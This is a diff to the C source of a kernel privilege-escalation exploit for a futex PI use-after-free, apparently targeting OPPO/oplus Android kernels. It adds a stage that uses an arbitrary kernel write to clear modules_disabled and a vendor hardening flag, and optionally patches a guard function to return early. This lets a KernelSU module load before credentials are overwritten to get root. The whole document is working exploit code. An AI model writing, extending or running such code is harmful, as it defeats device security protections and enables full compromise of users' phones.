@@ -1,7 +1,9 @@
 /*
  * GhostLock — CVE-2026-43499 futex PI UAF exploit
  *
- * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
+ * W1: SELinux permissive -> W1.5: disable oplus secure guard
+ *   -> W2: cred = init_cred -> W3: seccomp bypass ->
+ * independent root shell
  * independent root shell: ksud late-load + module watch.
  */
 
@@ -338,6 +340,91 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
     pr_warning("  PI route did not produce a verified write\n");
   }
   return routed;
+}
+
+/* ======================== W1.5: oplus guard bypass ========================
+ *
+ * Runs once after W1 (SELinux permissive) and before W2 (cred hijack).
+ * Goal: neuter `oplus_secure_guard_new` so the later KernelSU late-load
+ * (libksud.so -> finit_module) is not rejected by the vendor guard.
+ *
+ * IMPORTANT: we do NOT use do_one_write() here.  do_one_write()'s mcast path
+ * (uses_mcast_plist=1) hard-codes the written payload as:
+ *     value = (mode==2) ? INIT_CRED : data_addr(KIMAGE_TEXT_BASE)+MCAST_SCRATCH_OFF
+ * So passing value=0 or value=0xD65F03C0 to do_one_write(...,mode=0) would
+ * actually write that kernel-scratch POINTER, not the literal we want.
+ *
+ * Instead we drive the mcast primitive directly with the EXACT literal payload:
+ *     mcast_spray_nodes(literal, target, 96);
+ *     mcast_plist_write(target, literal, 3);
+ *
+ * The three targets live in BSS (linear/direct-map), so their offsets.json
+ * values are ABSOLUTE kernel virtual addresses -> passed as-is (no data_addr).
+ *
+ *   1) modules_disabled          -> 0  (allow module load/unload)
+ *   2) oplus_harden_init_succeed -> 0  (guard kretprobe handlers early-return)
+ *   3) cleanup_module            -> RET (0xD65F03C0) [OPTIONAL, see below]
+ *
+ * (3) is an 8-byte write via mcast, which also clobbers the 4 bytes at
+ * cleanup_module+4 (adjacent instructions).  Since (2) already silences the
+ * guard, (3) is disabled by default (W1_5_PATCH_CLEANUP=0).  Enable only
+ * after verifying the function prologue layout on your specific kernel.
+ *
+ * Any individual write may fail; attempt them all and report, but do NOT
+ * abort the exploit on failure.
+ * ===================================================================== */
+#define W1_5_PATCH_CLEANUP 0   /* set 1 only after verifying cleanup_module layout */
+
+static void w1_5_disable_oplus_guard(void) {
+  if (!active_offsets) return;
+
+  pr_info("=== W1.5: disable oplus secure guard ===\n");
+
+  /* ---------- helper: literal write via mcast plist primitive ---------- */
+  /* (defined as a nested function so it shares pr_info/mcast_* scope) */
+  void do_literal_write(uintptr_t target, uint64_t literal, const char *tag) {
+    pr_info("[W1.5] %s: kaddr=0x%016zx literal=0x%016llx\n",
+            tag, (size_t)target, (unsigned long long)literal);
+    int made = mcast_spray_nodes(literal, target, 96);
+    if (made <= 0) {
+      pr_warning("  [W1.5] %s: mcast spray failed\n", tag);
+      return;
+    }
+    int rc = mcast_plist_write(target, literal, 3);
+    mcast_teardown();
+    pr_info("[W1.5] %s write %s (rc=%d)\n", tag, rc == 0 ? "ok" : "FAILED", rc);
+  }
+
+  /* 1) modules_disabled = 0 */
+  if (active_offsets->off_modules_disabled) {
+    do_literal_write((uintptr_t)active_offsets->off_modules_disabled, 0,
+                     "modules_disabled=0");
+    usleep(50000);
+  } else {
+    pr_info("[W1.5] modules_disabled offset not set; skipping\n");
+  }
+
+  /* 2) oplus_harden_init_succeed = 0 */
+  if (active_offsets->off_oplus_harden_init_succeed) {
+    do_literal_write((uintptr_t)active_offsets->off_oplus_harden_init_succeed, 0,
+                     "oplus_harden_init_succeed=0");
+    usleep(50000);
+  } else {
+    pr_info("[W1.5] oplus_harden_init_succeed offset not set; skipping\n");
+  }
+
+  /* 3) [optional] cleanup_module -> aarch64 RET (0xD65F03C0) */
+#if W1_5_PATCH_CLEANUP
+  if (active_offsets->off_oplus_guard_cleanup) {
+    do_literal_write((uintptr_t)active_offsets->off_oplus_guard_cleanup,
+                     0xD65F03C0ULL, "cleanup_module=RET");
+    usleep(50000);
+  } else {
+    pr_info("[W1.5] oplus_guard_cleanup offset not set; skipping\n");
+  }
+#endif
+
+  pr_info("=== W1.5: done ===\n");
 }
 
 static int check_selinux_off(void) {
@@ -954,6 +1041,12 @@ int run_exploit(int argc, char **argv) {
   } else {
     pr_success("SELinux already permissive\n");
   }
+
+  /* W1.5: neuter oplus_secure_guard_new + clear modules_disabled so that
+   * the later KernelSU late-load (libksud.so -> finit_module) is not blocked.
+   * Runs after W1 (SELinux permissive) but before W2, reusing the same
+   * arbitrary-write primitive.  Failures here are non-fatal. */
+  w1_5_disable_oplus_guard();
 
   /* W2: overwrite the child credential via the task leaked by perf. */
   slab_drain();
